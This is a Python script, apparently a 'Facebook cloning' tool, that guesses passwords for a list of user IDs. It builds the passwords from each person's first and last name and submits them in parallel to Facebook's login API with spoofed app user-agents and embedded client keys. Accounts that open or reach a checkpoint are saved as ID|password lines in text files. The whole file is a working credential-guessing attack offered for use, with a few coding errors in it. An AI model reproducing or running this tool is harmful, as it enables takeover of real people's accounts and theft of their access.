#coding=utf-8
try: 
    import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct,subprocess
    from string import * 
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
try: 
    os.mkdir('/sdcard/ids') 
except:
    pass 

#===============Login System============
P = '\x1b[1;97m';G = '\x1b[1;97m';M = '\x1b[1;91m' ;H = '\x1b[1;92m';K = '\x1b[1;93m' ;B = '\x1b[1;94m' ;U = '\x1b[1;95m' ;O = '\x1b[1;96m' ;N = '\x1b[0m';W = '\033[97;1m' ;R = '\033[97;1m' ;G = '\033[97;1m' ;Y = '\033[97;1m' ;B = '\033[97;1m';P = '\033[97;1m';C = '\033[97;1m';N = '\x1b[0m'
Z = random.choice([P,M,H,K,B,U,O,N,G,R])     
#========logo1=======
logo="""
88888888ba  8b        d8  88  
88      "8b  Y8,    ,8P   88  
88      ,8P   `8b  d8"    88  
88_____-8P"     Y88P      88  
88------8b,     d88b      88  
88      `8b   ,8P  Y8,    88  
88      a8P  d8"    `8b   88  
88888888P"  8P        Y8  88  

--------------------------------------------------
➣ Auther   : DARK HACKER
➣ GitHub   : https://github.com/binyamin-binni
➣ YouTube  : XXXXXXX
➣ Blogspot : XXXXXXX
--------------------------------------------------
                                """
os.system("clear")
def lines():
        print(f'{W}=============================================\033[1;37m')
hh = ['[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693238;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.katana;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693253;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/145297323;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/2.3;FBBV/149649;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBPN/com.facebook.katana;FBDV/LG-P920;FBSV/2.2.2;]','[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]']
loop = 0
ok = []
methods = []
total=[]
android_models = []

def clear():
        os.system('clear')
        print(logo)

def main():
    os.system('clear')
    print(logo)
    print(' [1] File cloning')
    print(" [2] Exit ")
    lines()
    menu_opt = input(' [-] Select option: ')
    if menu_opt =='1':
        method_crack()
    elif menu_opt =='2':
        exit()
    else:
        print('\n Invalid option, try again ...')
        time.sleep(1)
        __i__smile()
def method_crack():
    global methods
    os.system('clear')
    print(logo)
    print(' [1] Method 1 (New)')
    print(' [2] Method 2 (Mix)')
    lines()
    me_opt = input(' Select method: ')
    if me_opt =='1':
        methods.append('m1')
        os.system('clear')
        print(logo)
        crack_main().crack(id)
    elif me_opt =='2':
        os.system('clear')
        methods.append('m2')
        crack_main().crack(id)
ad=[]


class crack_main():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        os.system('clear')
        print(logo)
        self.file = input(' Put file path: ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(' No file found ....')
            exit()
    def m1(self,iid,name,passlist):
        try:
            global ok,loop,android_models
            sys.stdout.write(' [Running] %s| OK: %s \r'%(loop,len(ok)));sys.stdout.flush()
            fn = name.split(' ')[0]
            try:
                ln = name.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                client_id = '350685531728'
                client_secrets = '62f8ce9f74b12f84c123cc23437a4a32'
                en = random.choice(['en_US','en_GB'])
                model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
                fbsv = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
                fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
                fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
                fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
                fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
                fbpn = random.choice(fbks)
                fbdv = model
                user1=str(M1())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(100,448))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(111111111,999999999))+";[FBAN/FB4A;FBAV/"+str(random.randint(300,400))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(10000000, 88888888))+";FBDM/{density=3.0,width=720,height=1640};FBLC/"+en+";FBRV/"+str(random.randint(10000000, 88888888))+";FBCR/"+network+";FBMF/"+fbmf+";FBBD/"+fbdv+";FBPN/"+fbpn+";FBDV/"+model+";FBSV/"+fbsv+";FBOP/19;FBCA/"+fbca+";]"                
                network=random.choice(['Mobilink','Ufone','Telenor','Zong','PTCL','WorldCall','Wateen','Nayaten','JIO','Vodafone','BSNL','Aircel','Idea','Rogers','Telus','Shaw Communications','Groupe Communications','AT&T','Facebook','Juniper Networks','Verizon','Arista Nertworks','Palo Alto Networks','Avon','Comsat'])
                adid = str(uuid.uuid4())
                device_id = str(uuid.uuid4())
                li = ['28','29','210']
                li2 = random.choice(li)
                j1 = ''.join(random.choice(digits) for _ in range(2))
                j2 = li2+j1

                data = {
                    'adid':adid,
                    'format':'json',
                    'api_key':client_id,
                    'community_id':'',
                    'device_id':device_id,
                    'family_device_id':device_id,
                    'currently_logged_in_userid':'0',
                    'try_num':'1',
                    'email':iid,
                    'password':pas,
                    'jazoest':j2,
                    'generate_analytics_claim':'1',
                    'cpl':'true',
                    'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3',
                    'fb4a_shared_phone_cpl_group':'enable_v3_at_risk',
                    'enroll_misauth':'false',
                    'generate_session_cookies':'1',
                #    'sim_serials':'%5B%2289014103211118510720%22%5D',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'auth.login',
                    'locale':'en_US',
                    'client_country_code':'US',
                    'advertising_id':adid,
                    'meta_inf_fbmeta':'NO_FILE',
                    'fb_api_req_friendly_name':'LoginOperations',
                    'fb_api_caller_class':'handlelogin',
                    'access_token':f'{client_id}|{client_secrets}'
                }
                head = {
                    'Authorization':f'OAuth {client_id}|{client_secrets}',
                    'X-FB-Connection-Quality':'EXCELLENT',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-net-hni':str(random.randint(3e7,4e7)),
                    'x-fb-connection-type':'unknown',
                    'x-fb-friendly_name':'authenticate',
                    'content-encoding':'application/x-www-form-urlencoded',
                    'x-fb-http-engine':'Liger',
                    'x-requested-with':'com.facebook.katana',
                    'user-agent':user1}
                url = 'https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true)'
                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in q:
                    print(' \033[0;32m [Successful] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
                elif 'two_factor' in q:
                	print(' \033[1;34m [2-fector] '+ids+' | '+pas+'\033[0;97m')
                	break
                elif 'm.facebook.com' in q['error']['message']:
                    print(' \033[0;31m [Checkpoint] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/cp.txt','a').write(iid+'|'+pas+'\n')
                else:
                    continue
            loop+=1
        except Exception as e:
            pass
    def m2(self,iid,name,passlist):
        try:
            global ok,loop,android_models
            sys.stdout.write(' [Running] %s| OK: %s \r'%(loop,len(ok)));sys.stdout.flush()
            fn = name.split(' ')[1]
            try:
                ln = name.split(' ')[0]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('lastfirst',fn.lower()).replace('last',fn).replace('last',ln.lower()).replace('first',ln).replace('Name',name).replace('name',name.lower())
                client_id = '181425161904154'
                client_secrets = '95a15d22a0e735b2983ecb9759dbaf91'
                version = str(random.randrange(8,15))
                osv = str(random.randrange(1,9))
                abv = ['D','E','F']
                
                if '8' in version:
                    ipsw = '10'+random.choice(abv)+str(random.randint(11,99))
                elif '9' in version:
                    ipsw = '11'+random.choice(abv)+str(random.randint(11,99))
                elif '10' in version:
                    ipsw = '14'+random.choice(abv)+str(random.randint(11,99))
                elif '11' in version:
                    ipsw = '15'+random.choice(abv)+str(random.randint(11,99))
                elif '12' in version:
                    ipsw = '16'+random.choice(abv)+str(random.randint(11,99))
                elif '13' in version:
                    ipsw = '17'+random.choice(abv)+str(random.randint(11,99))
                elif '14' in version:
                    ipsw = '18'+random.choice(abv)+str(random.randint(11,99))
                elif '15' in version:
                    ipsw = '19'+random.choice(abv)+str(random.randint(11,99))
                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
                application_version_code=str(random.randint(000000000,999999999))
                ua_ios = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+ipsw+' [FBAN/FBIOS;FBAV/'+application_version+';FBBV/'+application_version_code+';FBDV/'+version+'.'+osv+';FBMD/iPhone;FBSN/iOS;FBSV/'+version+'.'+osv+';FBSS/2;FBCR;]'
                uaft = random.choice(hh)
                adid = str(uuid.uuid4())
                device_id = str(uuid.uuid4())
                li = ['98','79','210']
                li2 = random.choice(li)
                j1 = ''.join(random.choice(digits) for _ in range(2))
                j2 = li2+j1
                data = {
                    'adid':adid,
                    'format':'json',
                    'api_key':client_id,
                    'community_id':'',
                    'device_id':device_id,
                    'family_device_id':device_id,
                    'currently_logged_in_userid':'0',
                    'try_num':'1',
                    'email':iid,
                    'password':pas,
                    'jazoest':j2,
                    'generate_analytics_claim':'1',
                    'cpl':'true',
                    'generate_session_cookies':'1',
                #    'sim_serials':'%5B%2289014103211118510720%22%5D',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'auth.login',
                    'locale':'en_US',
                    'client_country_code':'US',
                    'advertising_id':adid,
                    'meta_inf_fbmeta':'NO_FILE',
                    'access_token':f'{client_id}|{client_secrets}'
                }
                head = {
                    'Authorization':f'OAuth {client_id}|{client_secrets}',
                    'X-FB-Connection-Quality':'EXCELLENT',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
                    'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
                    'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
                    'x-fb-friendly_name':'authenticate',
                    'content-encoding':'application/x-www-form-urlencoded',
                    'x-tigon-is_retry':'true',
                    'x-fb-http-engine':'Liger',
                    'x-requested-with':'com.facebook.katana',
                    'connection':'close',
                    'user-agent':"[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693238;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.katana;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"}
                url = 'https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true)'
                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in q:
                    print(' \033[1;32m [Successful] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
                elif 'two_factor' in q:
                	print(' \033[1;34m [2-fector] '+ids+' | '+pas+'\033[0;97m')
                	break
                elif 'm.facebook.com' in q['error']['message']:
                    print(' \033[1;31m [Checkpoint] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/ids/cp.txt','a').write(iid+'|'+pas+'\n')
                else:
                    continue
            loop+=1
        except Exception as e:
            pass
            
      
    def pasw(self):
        passlist = []
        os.system('clear')
        print(logo)
        print(' [1] Choice passwords \n [2] Auto Passwords ')
        lines()
        ad = input(" [-] Enter Your Choice : ")
        if ad == '1':
        	print('\033[1;36m Put limit between 1 to 20\033[0;97m')
        	pl = int(input(' How many password do you want to add ? '))
        	print('\n\033[1;35m Password example: first123,first12345,firs786,firstlast, First last etc \033[0;97m')
        	print('')
        	if pl =='':
        	   print('\n Put limit between 1 to 20')
        	   time.sleep(1)
        	   passw(self)
        	elif pl > 20:
        	   print('\ Password limit should not be greater than 8')
        	   time.sleep(1)
        	   passw(self)
        	else:
        	   for cd in range(pl):
        	       passlist.append(input(f' Put passwod no {cd+1}: '))
        else:
        	  
        	  passlist.append('First Last')
        	  passlist.append('firstlast')
        	  passlist.append('first123')
        	  passlist.append('first12345')
        	  passlist.append('first1234')
        	  passlist.append('last123')
        	  passlist.append('last12345')
        	  passlist.append('last1122')
        	  passlist.append('last786')
        	  passlist.append('first786')
        	  passlist.append('first1122')
        	  passlist.append('firstlast')
        	  passlist.append('first last')
        os.system('clear')
        print(logo)
        tl = str(len(self.id))
        print(f' \033[1;37m(\033[1;32m+\033[1;37m) Total Account in Your File: {R}'+tl)
        print(' \033[1;37m(\033[1;32m+\033[1;37m) The process is running in the background')
        lines()
        with ThreadPool(max_workers=30) as formSubmit:
            for user in self.id:
                iid,name = user.split('|')
                if 'm1' in methods:
                    formSubmit.submit(self.m1,iid,name,passlist)
                elif 'm2' in methods:
                    formSubmit.submit(self.m2,iid,name,passlist)
                else:
                    print(' Internal script error, please contact to author')
                    exit()
        lines()
        print(' The process has been completed')
        print(' Total OK: '+str(len(ok)))
main()

